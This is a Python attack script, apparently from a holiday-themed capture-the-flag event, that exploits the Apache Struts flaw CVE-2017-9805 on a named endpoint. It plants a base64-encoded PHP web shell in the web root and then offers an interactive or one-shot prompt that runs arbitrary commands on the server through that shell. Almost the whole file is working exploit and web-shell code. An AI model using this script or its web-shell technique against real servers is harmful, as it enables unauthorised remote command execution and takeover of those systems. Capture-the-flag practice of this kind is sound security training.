#!/usr/bin/env python
from __future__ import print_function

import base64
import requests
import sys

from cve_2017_9805 import main as struts_exploit

VULNERABLE_ENDPOINT = "https://dev.northpolechristmastown.com/orders.xhtml"
BASE_URL = "https://l2s.northpolechristmastown.com/"
WEBSHELL = "4beadb1e-5ddb-4636-98a4-c2dac0f79ab3.php"
WEBSHELL_PAYLOAD = b'<?php system($_GET[cmd]); ?>\n'
WEBSHELL_PAYLOAD_ENCODED = base64.encodestring(WEBSHELL_PAYLOAD).strip()

## Emulate this command:
## /cve-2017-9805.py -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= | base64 -d > /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php' -u https://dev.northpolechristmastown.com/orders.xhtml
EXPLOIT_COMMAND = "echo {} | base64 -d > /var/www/html/{}".format(WEBSHELL_PAYLOAD_ENCODED, WEBSHELL)

def run_command(command):
    url = BASE_URL + WEBSHELL
    request = requests.get(url, params={"cmd":command})
    if request.status_code == 404:
        return None
    return request.text

#Main function
def setup():
    # See if we can run the id command, and if so, we are good to go...
    out = run_command('id')
    if out and 'uid=' in out:
        return True
    sys.stderr.write("The webshell did not exist, re-exploiting.....\n")
    struts_exploit(VULNERABLE_ENDPOINT, EXPLOIT_COMMAND)
    out = run_command('id')
    if out and 'uid=' in out:
        return True
    sys.stderr.write("The struts exploit/webshell failed :-(\n")
    sys.exit(1)

def interactive():
    setup()
    while True:
        try:
            cmd = raw_input("www-data@l2s:$ ")
        except EOFError:
            print()
            return
        print(run_command(cmd))

def one_shot(command):
    setup()
    print(run_command(command))

if __name__ == "__main__":
    if sys.argv[1:]:
        one_shot(' '.join(sys.argv[1:]))
    else:
        interactive()
